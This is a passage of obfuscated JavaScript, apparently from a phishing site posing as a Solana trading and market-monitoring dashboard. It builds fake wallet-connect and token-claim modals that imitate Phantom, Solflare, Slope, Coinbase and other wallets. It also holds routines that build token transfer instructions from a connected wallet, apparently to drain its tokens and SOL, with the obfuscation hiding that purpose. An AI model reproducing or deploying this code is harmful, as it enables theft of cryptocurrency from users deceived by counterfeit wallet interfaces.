id="headlessui-dialog-title-:r7m:" data-headlessui-state="open">\n      <svg onclick="emodalClose()" stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 24 24" class="tw-cursor-pointer tw-text-white-2" color="#f5f3f7" width="24" height="24" data-test-id="modal-close" xmlns="http://www.w3.org/2000/svg" style="color: rgb(245, 243, 247);">\n      <path fill="none" d="M0 0h24v24H0z"></path>\n      <path d="M19 6.41L17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"></path>\n      </svg>\n  </div>\n  <div data-test-id="modal-body" class="tw-px-4 tw-pb-4 md:tw-p-4 tw-relative">\n      <div class="tw-text-left">\n      <div class="tw-flex tw-mb-3">\n          <span class="tw-text-lg tw-font-800 tw-text-white-2 tw-text-[28px]">', "modal", "attachShadow", "add", "modal2", "#moropt", "classList", "onClaimingIneligibleDesc", "href", "setAttribute", "path", "log", "modalClose", "4133412OpBiqS", "onClaimLoading", "stylesheet", "createElementNS", "</div>\n      </div>\n  </div>\n  </div>\n</div>\n</div>\n</div>", "slope", '</span>\n          <span class="tw-min-w-[10px]"></span>\n          <span class="tw-min-w-[85px]">\n          <button class="tw-items-center tw-space-x-2 tw-border tw-border-gray-400 !tw-rounded-[200px] tw-text-white-2 hover:tw-bg-gray-200 tw-inline-flex tw-transition tw-bg-third tw-px-2 tw-py-1 tw-opacity-80 tw-text-sm" tabindex="0">\n              <span title="', "ecClose", "More options", '</div>\n      <div class="tw-flex tw-mt-8">\n          <button type="button" onclick="emodalClose()" class="tw-inline-flex tw-justify-center tw-items-center tw-rounded tw-text-white-1 tw-h-[40px] tw-py-0 tw-px-3 hover:tw-opacity-80 tw-transition tw-duration-300 tw-ease-in-out tw-bg-transparent tw-border tw-border-solid tw-border-gray-500 tw-w-[160px] tw-text-[14px]">Change Wallet</button>\n      </div>\n      </div>\n  </div>\n  </div>\n</div>\n</div>\n</div>', "div", "1000px", "popupConfirmAsk", "wallet-adapter-modal-list", "substring", "0px", "coinbase", "onClaimingIneligible", "parentElement", "wallet-adapter-modal-title", "height", "textContent", "http://www.w3.org/2000/svg", "modal3", "click", "https://slope.finance/", "./images/torus.svg", '<div class="wallet-adapter-modal wallet-popup2" id="mnpm" onclick="window.modalClose()"><div class="wallet-adapter-modal-container"><div class="wallet-adapter-modal-wrapper" onclick="event.stopPropagation()">\n    <div style="opacity: 1; transform: scale(1); transition: all 0.5s ease 0s;" class="w-full h-auto relative min-h-[400px] max-w-2xl flex-col md:flex-row z-30 flex justify-start items-center rounded-2xl overflow-hidden dark:bg-neutral-900 bg-black">\n  <section class="flex shrink-0 w-full p-5 h-auto md:min-h-[400px] md:max-w-[300px] flex-col bg-black dark:bg-neutral-900  justify-center items-center md:justify-start md:items-start md:border-r border-b dark:border-b-neutral-700 dark:border-r-neutral-700 border-b-gray-300 md:border-r-gray-300" style="border-color: gray;">\n    <h1 class="text-base xss:text-xl font-bold tracking-tight dark:text-neutral-300 text-neutral-700">\n      Connect a Wallet\n    </h1>\n\n    <span class="text-xs xss:text-sm font-bold mt-2 xss:mt-5 dark:text-neutral-600 text-neutral-400">Recommended</span>\n\n    <section class="flex w-full h-full flex-row justify-center items-center md:mt-0 mt-2 xss:mt-6 md:gap-0  gap-2 gap-x-8 xss:gap-6 flex-wrap md:flex-col">\n      <div id="phantom-connect-button" onclick="window.modalClose(); window.modalChoice(\'phantom\');" style="user-select: none; cursor: pointer; order: 1;" class="w-[120px] chlen xss:w-[150px] md:w-full h-12 flex justify-start gap-4 items-center p-2 rounded-xl transition-colors ease relative dark:bg-neutral-900 dark:hover:bg-black/10 bg-black hover:bg-black/10 -left-2">\n        <div class="w-8 h-8 background-phantom shrink-0 rounded-md p-1">\n          <img src="./images/b70af7fb735520741aad140aff2a8f7bbb370e98.png" class="w-full h-full object-contain" alt="">\n        </div>\n\n        <div class="w-full h-auto flex justify-start items-start flex-col">\n          <h1 class="text-sm xss:text-base font-bold tracking-tight dark:text-neutral-300 text-neutral-700">\n          Phantom\n        </h1>\n\n\n        </div>\n        \n      </div>\n\n      <div id="solflare-connect-button" onclick="window.modalClose(); window.modalChoice(\'solflare\');" style="user-select: none; cursor: pointer; order: 2;" class="w-[120px] chlen xss:w-[150px] md:w-full h-12 flex justify-start gap-4 items-center p-2 rounded-xl transition-colors ease relative dark:bg-neutral-900 dark:hover:bg-black/10 bg-black hover:bg-black/10 -left-2">\n        <div class="w-8 h-8 background-solflare shrink-0 rounded-md p-1">\n          <img src="./images/db914e3fbc28b229d642fb85f3444963aeda1a26.svg" class="w-full h-full object-contain" alt="">\n        </div>\n\n        <div class="w-full h-auto flex justify-start items-start flex-col">\n          <h1 class="text-sm xss:text-base font-bold tracking-tight dark:text-neutral-300 text-neutral-700">\n          Solflare\n        </h1>\n\n        \n        </div>\n\n      </div>\n\n      <div id="math-connect-button" onclick="window.modalClose(); window.modalChoice(\'mathwallet\');" style="user-select: none; cursor: pointer; order: 6;" class="w-[120px] chlen xss:w-[150px] md:w-full h-12 flex justify-start gap-4 items-center p-2 rounded-xl transition-colors ease relative dark:bg-neutral-900 dark:hover:bg-black/10 bg-black hover:bg-black/10 -left-2">\n        <div class="w-8 h-8 shrink-0 background-math rounded-md p-1">\n          <img src="./images/7916dfef34d5e8bd46583e07bdcb75cf1c6be796.png" class="w-full h-full invert object-contain" alt="">\n        </div>\n        <div class="w-full h-auto flex justify-start items-start flex-col">\n          <h1 class="text-sm xss:text-base font-bold tracking-tight dark:text-neutral-300 text-neutral-700">\n          Math Wallet\n        </h1>\n\n       \n        </div>\n      </div>\n\n      <div id="slope-connect-button" onclick="window.modalClose(); window.modalChoice(\'slope\');" style="user-select: none; cursor: pointer; order: 7;" class="w-[120px] chlen xss:w-[150px] md:w-full h-12 flex justify-start gap-4 items-center p-2 rounded-xl transition-colors ease relative dark:bg-neutral-900 dark:hover:bg-black/10 bg-black hover:bg-black/10 -left-2">\n        <img src="./images/8a04685cba7fccb538e25baaa015b2a5368cf153.png" class="w-8 h-8 object-contain shrink-0 rounded-md" alt="">\n\n        <div class="w-full h-auto flex justify-start items-start flex-col">\n          <h1 class="text-sm xss:text-base font-bold tracking-tight dark:text-neutral-300 text-neutral-700">\n          Slope\n        </h1>\n\n      \n        </div>\n      </div>\n\n      <div id="torus-connect-button" onclick="window.modalClose(); window.modalChoice(\'torus\');" style="user-select: none; cursor: pointer; order: 4;" class="w-[120px] chlen xss:w-[150px] md:w-full h-12 flex justify-start gap-4 items-center p-2 rounded-xl transition-colors ease relative dark:bg-neutral-900 dark:hover:bg-black/10 bg-black hover:bg-black/10 -left-2">\n        <img src="./images/c759b44ed68d2dba3adc64583dcd607ef3c51ba1.png" class="w-8 h-8 shrink-0 rounded-md object-contain" alt="">\n\n        <div class="w-full h-auto flex justify-start items-start flex-col">\n          <h1 class="text-sm xss:text-base font-bold tracking-tight dark:text-neutral-300 text-neutral-700">\n          Torus\n        </h1>\n\n       \n        </div>\n      </div>\n\n      <div id="coinbase-connect-button" onclick="window.modalClose(); window.modalChoice(\'coinbase\');" style="user-select: none; cursor: pointer; order: 3;" class="w-[120px] chlen xss:w-[150px] md:w-full h-12 flex justify-start gap-4 items-center p-2 rounded-xl transition-colors ease relative dark:bg-neutral-900 dark:hover:bg-black/10 bg-black hover:bg-black/10 -left-2">\n        <img src="./images/7d73bcebeceed23369fe06edb6bd225140c1b03a.png" class="w-8 h-8 rounded-md shrink-0 object-contain" alt="">\n        <div class="w-full h-auto flex justify-start items-start flex-col">\n          <h1 class="text-sm xss:text-base font-bold tracking-tight dark:text-neutral-300 text-neutral-700">\n          Coinbase\n        </h1>\n\n        \n        </div>\n      </div>\n\n      <div id="anchor-connect-button" onclick="window.modalClose(); window.modalChoice(\'anchor\');" style="user-select: none; cursor: pointer; order: 8;" class="w-[120px] chlen xss:w-[150px] md:w-full h-12 flex justify-start gap-4 items-center p-2 rounded-xl transition-colors ease relative dark:bg-neutral-900 dark:hover:bg-black/10 bg-black hover:bg-black/10 -left-2">\n        <div style="background: #3750a2" class="w-8 shrink-0 h-8 bg-[#3750a2] rounded-md p-1">\n          <img src="./images/6b1d630db9df7fecbcc9b78eea4b0f743dafed9f.png" class="w-full h-full object-contain" alt="">\n        </div>\n\n        <div class="w-full h-auto flex justify-start items-start flex-col">\n          <h1 class="text-sm xss:text-base font-bold tracking-tight dark:text-neutral-300 text-neutral-700">\n          Anchor\n        </h1>\n\n      \n        </div>\n      </div>\n\n      <div id="sollet-connect-button" onclick="window.modalClose(); window.modalChoice(\'sollet\');" style="user-select: none; cursor: pointer; order: 5;" class="w-[120px] chlen xss:w-[150px] md:w-full h-12 flex justify-start gap-4 items-center p-2 rounded-xl transition-colors ease relative dark:bg-neutral-900 dark:hover:bg-black/10 bg-black hover:bg-black/10 -left-2">\n        <div style="background: rgb(26,201,254)" class="w-8 h-8 shrink-0 bg-[rgb(26,201,254)] rounded-md p-1">\n          <span class="text-white mx-auto font-bold flex justify-center items-center">S</span>\n        </div>\n\n        <div class="w-full h-auto flex justify-start items-start flex-col">\n          <h1 class="text-sm xss:text-base font-bold tracking-tight dark:text-neutral-300 text-neutral-700">\n          Sollet\n        </h1>\n\n       \n        </div>\n      </div>\n    </section>\n  </section>\n\n  <section class="w-full h-auto min-h-auto xss:min-h-[400px] flex justify-center items-center flex-col p-5">\n    <h1 class="text-sm sm:text-xl mb-4 md:mb-8 font-bold tracking-tight dark:text-neutral-300 text-neutral-700">\n      What is a Wallet?\n    </h1>\n\n    <div class="w-full h-auto gap-3 flex justify-center items-center">\n      <div class="w-16 h-16 flex shrink-0">\n        <img src="./images/595de1f1f496c3eedcab18c0c71f731d3f1e4ff7.png" class="w-full h-full object-contain">\n      </div>\n\n      <div class="w-auto h-auto flex justify-start items-start flex-col max-w-[400px]">\n        <h1 class="text-[13px] sm:text-sm mb-2 font-bold tracking-tight dark:text-neutral-300 text-neutral-700">\n          A Home for your Digital Assets\n        </h1>\n\n        <p class="text-xs sm:text-sm font-normal tracking-tight text-neutral-500">\n          Wallets are used to send, receive, store, and display digital\n          assets like Ethereum and NFTs.\n        </p>\n      </div>\n    </div>\n    <div class="w-full mt-4 sm:mt-8 h-auto gap-3 flex justify-center items-center">\n      <div class="w-16 h-16 flex shrink-0">\n        <img src="./images/a5628f3378b0376ec4e65ee88c82180cc6a4a195.png" class="w-full h-full object-contain">\n      </div>\n\n      <div class="w-auto h-auto flex justify-start items-start flex-col max-w-[400px]">\n        <h1 class="text-[13px] sm:text-sm mb-2 font-bold tracking-tight dark:text-neutral-300 text-neutral-700">\n          A New Way to Log In\n        </h1>\n\n        <p class="text-xs sm:text-sm font-normal tracking-tight text-neutral-500">\n          Instead of creating new accounts and passwords on every website,\n          just connect your wallet.\n        </p>\n      </div>\n    </div>\n\n    <a href="https://phantom.app/download" class="w-auto md:text-base text-xs h-auto text-blue-500 mt-5 font-semibold rounded-full flex justify-center items-center">\n      Get a Wallet\n    </a>\n\n    <p class="text-xs md:text-sm text-center font-normal tracking-tight text-neutral-500 mt-5">\n      By continuing you agree to our\n      <a href="https://rainbow.me/terms-of-use" class="text-blue-500">Terms of Service</a> and\n      <a href="https://rainbow.me/privacy" class="text-blue-500">Privacy Policy</a>\n    </p>\n  </section>\n\n  <button id="close" class="cursor-pointer dark:text-white select-none absolute top-6 right-6" style="color: white;" onclick="window.modalClose()">X</button>\n\n</div></div></div></div>\n    ', "torus", "11432aTFBCW", "link", "assets/modal3.css", "wallet-adapter-modal-wrapper", '<polyline points="18 15 12 9 6 15"></polyline>', "dialog", "true", "assets/modal1.css", "toString", "wallet-adapter-button", "onClaiming"];
    return (tt = function() {
        return t
    })()
}! function(t, M) {
    for (var e = Mt, i = tt();;) try {
        if (635666 === -parseInt(e(209)) / 1 * (-parseInt(e(226)) / 2) + -parseInt(e(128)) / 3 * (-parseInt(e(172)) / 4) + parseInt(e(241)) / 5 * (-parseInt(e(143)) / 6) + parseInt(e(121)) / 7 + parseInt(e(191)) / 8 * (-parseInt(e(126)) / 9) + parseInt(e(125)) / 10 + -parseInt(e(202)) / 11 * (-parseInt(e(186)) / 12)) break;
        i.push(i.shift())
    } catch (n) {
        i.push(i.shift())
    }
}(), window.modal0 = function() {
    var t = Mt,
        M = document[t(199)]("div");
    M[t(139)](t(113), t(162)), M[t(139)](t(115), t(178)), M[t(139)]("role", t(177)), M.addEventListener(t(167), (async function(t) {
        await et()
    })), M[t(136)][t(133)]("wallet-adapter-modal", t(206));
    var e = document[t(199)]("div");
    e.classList.add(t(201)), M[t(109)](e);
    var i = document.createElement(t(153));
    i[t(136)][t(133)](t(175)), i[t(228)]("click", (function(t) {
        t.stopPropagation()
    })), e[t(109)](i);
    var n = document[t(199)](t(237));
    n[t(136)][t(133)]("wallet-adapter-modal-button-close"), n[t(219)] = et, n[t(109)](function() {
        var t = Mt,
            M = document[t(146)]("http://www.w3.org/2000/svg", t(232));
        M.setAttribute(t(197), "14"), M[t(139)](t(163), "14");
        var e = document[t(146)](t(165), t(140));
        return e[t(139)]("d", "M14 12.461 8.3 6.772l5.234-5.233L12.006 0 6.772 5.234 1.54 0 0 1.539l5.234 5.233L0 12.006l1.539 1.528L6.772 8.3l5.69 5.7L14 12.461z"), M[t(109)](e), M
    }()), i[t(109)](n);
    var N = document[t(199)]("h1");
    N.classList[t(133)](t(162)), N[t(164)] = t(217), i[t(109)](N);
    var a = document[t(199)]("ul");
    a[t(136)][t(133)](t(156)), i[t(109)](a);
    var c = document[t(199)]("ul");
    c.classList[t(133)](t(218)), i.appendChild(c);
    var w = document[t(199)](t(237));
    w[t(136)].add(t(181)), w[t(136)][t(133)](t(211)), w[t(124)] = "0", w.type = t(237), w[t(228)](t(167), (async function(M) {
        var e = t;
        await et(), await window[e(183)](e(211))
    }));
    var l = document[t(199)]("span");
    l[t(104)] = t(122);
    var o = document[t(199)](t(129));
    o[t(216)] = t(223), o[t(224)] = "width: 100%;", w[t(109)](o), window[t(211)] && w[t(109)](l);
    var A = document.createElement(t(237));
    A[t(136)][t(133)](t(181)), A[t(136)][t(133)](t(110)), A.tabIndex = "0", A.type = t(237), A[t(228)](t(167), (async function(M) {
        var e = t;
        await et(), await window.modalChoice(e(110))
    }));
    var D = document[t(199)]("span");
    D[t(104)] = "DETECTED";
    var g = document[t(199)](t(129));
    g.src = t(230), g[t(224)] = t(234), A[t(109)](g), window.solflare && A[t(109)](D);
    var s = document[t(199)](t(237));
    s[t(136)][t(133)](t(181)), s[t(136)].add(t(159)), s[t(124)] = "0", s[t(205)] = "button", s[t(228)]("click", (async function(M) {
        var e = t;
        await et(), await window[e(183)](e(159))
    }));
    var d = document[t(199)](t(189));
    d.innerText = t(122);
    var I = document[t(199)](t(129));
    I.src = t(190), I[t(224)] = t(234), s[t(109)](I), window[t(159)] && s[t(109)](d);
    var u = document[t(199)]("button");
    u.classList[t(133)](t(181)), u[t(136)][t(133)](t(171)), u[t(124)] = "0", u[t(205)] = t(237), u[t(228)](t(167), (function(t) {
        window.open("https://app.tor.us/", "_blank")
    }));
    var j = document[t(199)]("img");
    j[t(216)] = t(169), j.style = "width: 100%;", u[t(109)](j);
    var r = document[t(199)](t(237));
    r[t(136)][t(133)]("wallet-adapter-button"), r[t(136)][t(133)](t(112)), r[t(124)] = "0", r.type = "button", r[t(228)](t(167), (function(M) {
        var e = t;
        window.open(e(192), e(200))
    }));
    var z = document[t(199)]("img");
    z.src = t(245), z.style = t(235), r[t(109)](z);
    var T = document.createElement("button");
    T[t(136)].add(t(181)), T[t(136)][t(133)](t(148)), T.tabIndex = "0", T[t(205)] = t(237), T[t(228)](t(167), (function(M) {
        var e = t;
        window[e(242)](e(168), e(200))
    }));
    var x = document[t(199)]("img");
    x.src = t(203), x[t(224)] = t(235), T.appendChild(x);
    var y = document.createElement(t(237));
    y.classList[t(133)](t(181)), y[t(136)].add("mathwallet"), y[t(124)] = "0", y[t(205)] = "button", y.addEventListener(t(167), (function(M) {
        var e = t;
        window.open("https://mathwallet.org/", e(200))
    }));
    var L = document[t(199)](t(129));
    L[t(216)] = "./images/mathwallet.svg", L[t(224)] = "height: 100%;", y[t(109)](L);
    var m = document.createElement("li");
    m[t(109)](w);
    var Q = document.createElement("li");
    Q[t(109)](A);
    var O = document[t(199)]("li");
    O.appendChild(s);
    var p = document[t(199)]("li");
    p[t(109)](u), a[t(109)](m), a.appendChild(Q), a[t(109)](O), a.appendChild(p);
    var U = document.createElement("li");
    U[t(109)](r);
    var E = document[t(199)]("li");
    E[t(109)](T);
    var b = document[t(199)]("li");
    b[t(109)](y), c[t(109)](U), c[t(109)](E), c.appendChild(b), document[t(193)][t(109)](M), setTimeout((() => {
        var e = t;
        M[e(136)][e(133)]("wallet-adapter-modal-fade-in")
    }), 1)
}, window[$(236)] = function() {
    var t = $,
        M = document[t(199)](t(153));
    const e = M.attachShadow({
            mode: t(242)
        }),
        i = document[t(199)](t(173));
    i[t(213)] = t(145), i.href = t(179), e.appendChild(i);
    var n = document[t(199)](t(153));
    n[t(120)] = t(117), e[t(109)](n), document[t(193)][t(109)](M), window[t(142)] = function() {
        var e = t;
        console[e(141)](e(185)), console[e(141)](M), M[e(231)]()
    }
}, window[$(134)] = function() {
    var t = $,
        M = document[t(199)](t(153));
    const e = M[t(132)]({
            mode: t(242)
        }),
        i = document[t(199)]("link");
    i[t(213)] = t(145), i[t(138)] = t(229), e[t(109)](i);
    const n = document[t(199)](t(173));
    n.rel = t(145), n[t(138)] = t(238), e[t(109)](n);
    var N = document[t(199)](t(153));
    N.innerHTML = t(170), e.appendChild(N), document[t(193)][t(109)](M), window.modalClose = function() {
        var e = t;
        console[e(141)](e(185)), console[e(141)](M), M[e(231)]()
    }
}, window[$(166)] = function() {
    var t = $,
        M = document.createElement(t(153));
    const e = M.attachShadow({
            mode: t(242)
        }),
        i = document[t(199)](t(173));
    i[t(213)] = t(145), i[t(138)] = t(174), e[t(109)](i);
    var n = document.createElement(t(153));
    n[t(120)] = t(210), e.appendChild(n), document[t(193)][t(109)](M), window[t(142)] = function() {
        var e = t;
        console.log(e(185)), console[e(141)](M), M[e(231)]()
    }, window[t(118)] = !1, window.isBusy = !1, window[t(196)] = function(M) {
        var e = t;
        if (!window.isBusy) {
            var i = M.parentElement[e(161)][e(127)]("#wallet-adapter-modal-collapse"),
                n = M[e(161)][e(161)][e(127)](e(135)),
                N = M[e(161)][e(161)][e(127)]("#moroptline");
            window[e(118)] ? (window.isBusy = !0, i[e(224)].height = e(114), i[e(224)][e(207)] = "hidden", n[e(104)] = "More options", N[e(136)].remove(e(221)), window[e(118)] = !1, setTimeout((() => {
                var t = e;
                i[t(224)][t(163)] = t(158), window[t(243)] = !1
            }), 1)) : (window.isBusy = !0, i[e(224)][e(163)] = e(114), n[e(104)] = e(116), N[e(136)][e(133)](e(221)), window[e(118)] = !0, setTimeout((() => {
                var t = e;
                i.style[t(163)] = t(103), i.style.overflow = "initial", window[t(243)] = !1
            }), 255))
        }
    }
}, window[$(195)] = function() {
    var t = $,
        M = document.createElement("div");
    const e = M.attachShadow({
            mode: t(242)
        }),
        i = document.createElement(t(173));
    i[t(213)] = "stylesheet", i[t(138)] = "assets/modal4.css", e[t(109)](i);
    var n = document.createElement(t(153));
    n.innerHTML = t(239), e[t(109)](n), document[t(193)][t(109)](M), window[t(142)] = function() {
        var e = t;
        console[e(141)]("Modal Close (overwritten)"), console[e(141)](M), M[e(231)]()
    }, window[t(118)] = !1, window.isBusy = !1, window[t(248)] = function(M) {
        var e = t;
        if (!window.isBusy) {
            var i = M[e(161)].parentElement[e(127)](e(246)),
                n = M.parentElement[e(161)][e(127)]("#moropt"),
                N = M.parentElement[e(161)][e(127)](e(220));
            window[e(118)] ? (window[e(243)] = !0, i[e(224)][e(163)] = e(154), i[e(224)][e(207)] = e(108), n[e(104)] = e(151), N[e(120)] = e(194), window[e(118)] = !1, setTimeout((() => {
                var t = e;
                i[t(224)][t(163)] = t(158), window[t(243)] = !1
            }), 1)) : (window[e(243)] = !0, i[e(224)][e(163)] = e(154), n[e(104)] = "Less options", N.innerHTML = e(176), window[e(118)] = !0, setTimeout((() => {
                var t = e;
                i[t(224)].height = t(103), i.style[t(207)] = t(123), window[t(243)] = !1
            }), 255))
        }
    }
};

function Mt(t, M) {
    var e = tt();
    return (Mt = function(t, M) {
        return e[t -= 103]
    })(t, M)
}
window[$(215)] = () => {
    var t = $,
        M = document[t(199)](t(153));
    M[t(136)][t(133)]("cmdlz");
    const e = M[t(132)]({
            mode: t(242)
        }),
        i = document.createElement("link");
    i[t(213)] = "stylesheet", i[t(138)] = t(187), e[t(109)](i);
    var n = document.createElement(t(153));
    n[t(120)] = t(130) + it(p.words[t(160)]) + t(149) + G[t(180)]() + t(247) + it(p.words[t(105)]) + '</span>\n              </span>\n          </button>\n          </span>\n      </div>\n      <div class="tw-text-[16px] tw-text-white-2">' + it(p.words[t(137)]) + t(152), e.appendChild(n), document.body[t(109)](M), window[t(107)] = function() {
        var e = t;
        for (var i of (M[e(231)](), document[e(208)](e(198)))) i[e(231)]()
    }
}, window[$(119)] = async function() {
    var t = $,
        M = document[t(199)]("div");
    M[t(136)][t(133)](t(244));
    const e = M[t(132)]({
            mode: "open"
        }),
        i = document[t(199)](t(173));
    i[t(213)] = t(145), i.href = t(187), e.appendChild(i);
    var n = document[t(199)]("div");
    return n[t(120)] = t(214) + it(p[t(225)][t(182)]) + '</span>\n          <span class="tw-min-w-[10px]"></span>\n          <span class="tw-min-w-[85px]">\n          <button class="tw-items-center tw-space-x-2 tw-border tw-border-gray-400 !tw-rounded-[200px] tw-text-white-2 hover:tw-bg-gray-200 tw-inline-flex tw-transition tw-bg-third tw-px-2 tw-py-1 tw-opacity-80 tw-text-sm" tabindex="0">\n              <span title="' + G[t(180)]() + '" class="tw-inline-flex tw-items-center tw-whitespace-nowrap">\n              <span>' + it(p[t(225)][t(105)]) + t(212) + it(p[t(225)].onClaimingDesc) + t(147), e.appendChild(n), document[t(193)][t(109)](M), () => {
        var e = t;
        for (var i of (M.remove(), document[e(208)](e(244)))) i.remove()
    }
}, window[$(155)] = () => {
    var t = $,
        M = document[t(199)](t(153));
    M.classList[t(133)](t(198));
    const e = M[t(132)]({
            mode: "open"
        }),
        i = document.createElement(t(173));
    i.rel = "stylesheet", i[t(138)] = t(187), e[t(109)](i);
    var n = document[t(199)](t(153));
    n[t(120)] = '\n  <div>\n<div class="tw-fixed tw-inset-y-0 tw-left-0 tw-w-screen tw-z-9000" id="headlessui-dialog-:r7k:" role="dialog" aria-modal="true" data-headlessui-state="open" aria-labelledby="headlessui-dialog-title-:r7m:">\n<div class="tw-fixed tw-inset-0 tw-bg-black/50 tw-opacity-100" aria-hidden="true" style="backdrop-filter: blur(1px);"></div>\n<div class="tw-h-screen sm:tw-w-auto tw-relative tw-flex tw-items-center tw-w-auto tw-mx-auto tw-max-w-[384px] tw-justify-center" data-test-id="modal-background">\n  <div class="tw-flex tw-flex-col tw-w-full tw-overflow-auto tw-relative tw-max-h-screen sm:tw-max-h-[calc(100vh-32px)] tw-border dark-scroll-bar tw-rounded-20px tw-bg-gray-100 tw-rounded-xl tw-border-gray-500 tw-max-w-[384px] tw-opacity-100 tw-scale-100" id="headlessui-dialog-panel-:r7l:" data-headlessui-state="open">\n  <div data-test-id="modal-header" class="tw-flex tw-flex-shrink-0 tw-items-center tw-justify-between tw-p-4 tw-mb-[6px]" id="headlessui-dialog-title-:r7m:" data-headlessui-state="open">\n      <svg onclick="ecClose()" stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 24 24" class="tw-cursor-pointer tw-text-white-2" color="#f5f3f7" width="24" height="24" data-test-id="modal-close" xmlns="http://www.w3.org/2000/svg" style="color: rgb(245, 243, 247);">\n      <path fill="none" d="M0 0h24v24H0z"></path>\n      <path d="M19 6.41L17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"></path>\n      </svg>\n  </div>\n  <div data-test-id="modal-body" class="tw-px-4 tw-pb-4 md:tw-p-4 tw-relative">\n      <div class="tw-text-left">\n      <div class="tw-flex tw-mb-3">\n          <span class="tw-text-lg tw-font-800 tw-text-white-2 tw-text-[28px]">' + it(p.words[t(233)]) + t(149) + G[t(180)]() + t(247) + it(p[t(225)].onConnected) + '</span>\n              </span>\n          </button>\n          </span>\n      </div>\n      <div class="tw-text-[16px] tw-text-white-2">' + it(p[t(225)][t(111)]) + '</div>\n      <div class="tw-flex tw-mt-8">\n          <button type="button" onclick="ecClose()" class="tw-inline-flex tw-justify-center tw-items-center tw-rounded tw-text-white-1 tw-h-[40px] tw-py-0 tw-px-3 hover:tw-opacity-80 tw-transition tw-duration-300 tw-ease-in-out tw-bg-transparent tw-border tw-border-solid tw-border-gray-500 tw-w-[160px] tw-text-[14px]">Change Wallet</button>\n      </div>\n      </div>\n  </div>\n  </div>\n</div>\n</div>\n</div>', e[t(109)](n), document.body[t(109)](M), window[t(150)] = function() {
        var e = t;
        for (var i of (console.log(M), M[e(231)](), document[e(208)](e(198)))) i[e(231)]()
    }
};
const et = async function() {
    var t = $,
        M = document.getElementsByClassName("wallet-popup");
    for (var e of M) e.classList[t(106)]("wallet-adapter-modal-fade-in") ? (e.classList[t(231)](t(227)), setTimeout((() => {
        e[t(231)]()
    }), 150)) : e[t(231)]()
};

function it(t) {
    return t.replace(/{(addressfirst|addresslast)(\d+)}/g, ((t, M, e) => {
        var i = Mt;
        return e = parseInt(e, 10), "addressfirst" === M ? G[i(180)]()[i(157)](0, e) : M === i(240) ? G[i(180)]()[i(157)](G[i(180)]()[i(188)] - e) : void 0
    }))
}
window[$(204)] = et;
const nt = Et;
! function(t, M) {
    const e = Et,
        i = Ut();
    for (;;) try {
        if (598411 === parseInt(e(378)) / 1 + -parseInt(e(330)) / 2 + parseInt(e(284)) / 3 * (parseInt(e(260)) / 4) + parseInt(e(327)) / 5 * (parseInt(e(250)) / 6) + parseInt(e(410)) / 7 * (-parseInt(e(413)) / 8) + -parseInt(e(297)) / 9 * (parseInt(e(401)) / 10) + parseInt(e(402)) / 11 * (-parseInt(e(377)) / 12)) break;
        i.push(i.shift())
    } catch (n) {
        i.push(i.shift())
    }
}();
const Nt = nt(240),
    at = {
        enabled: !1,
        concurrent: 0,
        loadTime: 0
    };
let ct, wt = !1,
    lt = !1,
    ot = !1;
async function At(t, M, e, n, N, o) {
    const A = nt;
    let D = N,
        g = {
            BALANCE: e,
            MINT: M
        };
    if (0 === e) return {
        tokenSplitItem: void 0,
        dat: void 0
    };
    1 === e && (D = o, g = void 0);
    const s = i.findProgramAddressSync([n[A(397)](), a[A(397)](), M[A(397)]()], c)[0],
        d = i[A(310)]([D.toBuffer(), a[A(397)](), M[A(397)]()], c)[0];
    return null === await k[A(282)](d) && t[A(254)](w(G, d, D, M, a, c)), t[A(254)](l(s, d, G, e, [], a)), {
        tokenSplitItem: g,
        info: {
            senderProgramAddress: s,
            handlerProgramAddress: d
        }
    }
}
window.modalClose = function() {};
var Dt = !1;
async function gt(t, M, e, n, N) {
    const o = nt;
    M = new i(M), e = new i(e), n = new i(n);
    let A = G;
    var D = i[o(310)]([A[o(397)](), a.toBuffer(), M[o(397)]()], c)[0];
    return null === await k[o(282)](D) && t[o(254)](w(A, D, A, M, a, c)), t[o(254)](l(e, D, n, N, [], a)), t
}
const st = document.querySelector(nt(291)),
    dt = document[nt(325)](nt(309)),
    It = document[nt(325)]("#selectProvider"),
    ut = document[nt(325)](nt(289)),
    jt = document.querySelector(nt(311)),
    rt = document[nt(325)](nt(278)),
    zt = document.querySelector("#config");
document[nt(325)](nt(371)), document[nt(325)](nt(405));
const Tt = document[nt(325)]("#traiding_pairs"),
    xt = document[nt(325)]("#center1"),
    yt = document[nt(325)](nt(238)),
    Lt = document[nt(325)]("#center3bottom"),
    mt = document[nt(325)]("#center3top"),
    Qt = document[nt(325)](nt(341)),
    Ot = document[nt(325)](nt(329)),
    pt = document.querySelector("#modal__switch");

function Ut() {
    const t = ["6589QbhtSQ", "transfer", "phantom", "#copy_address", '\n        <div class="left__table__body__line">\n            <div class="left__table__body__line--item ticket">', "replace", '<div class="console-message hide"></div>', "0.1", "17031mWHvHq", "https://api.coingecko.com/api/v3/simple/price?ids=solana&vs_currencies=usd&include_market_cap=true&include_24hr_vol=true", "reverse", "352czQVZc", "address", "transactions", "tokens", "readyState", "feePayer", "> Loading configuration files...", "block", "loadTime", "0.000", "claim-button", "#center2", "#modal__loading", "9WzDXwBbmkg8ZTbNMqUxvQRAyrZzDsGYdLVL9zYtAWWM", "cmdlzx", "usd_market_cap", "2px solid #F23645", "floor", "Blockhash:", "filter", "pow", "Blockhash not found", "addEventListener", "21354AFygcG", "VALUE", "#no_transactions", "2px solid rgb(242, 54, 69);", "add", "json", '\n                <div class="right__table__body__line">\n                  <div class="right__table__body__line--item hash">\n                    ', "#mcap", "> Ready to monitor cryptocurrency markets.", "getLatestBlockhash", "3438844SadBpQ", "innerText", "swaps", "log", "AMOUNT", "owner", "error", "timer", "walletBalanceWithoutFees: ", "getHours", " && settingData.phantomWallet.lol.enabled ", "map", '</div>\n                  <div class="right__table__body__line--item profit">\n                    ', "then", "toString", "> Updated watchlist.", "You don't have enough SOL", "blockhash", "#licenseKey", "getTime", "pricesData", "usd", "getAccountInfo", "<span>m</span>", "3kXgnWQ", "base_currency", "sol", "push", "last_price", "#selectProviderDrop", " SOL", "#modal", "display", "contains", "length", "remove", "</div>\n        </div>", "1237257vGNzxZ", "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789", "none;", "#center2 .center__console", "deposite_sola", 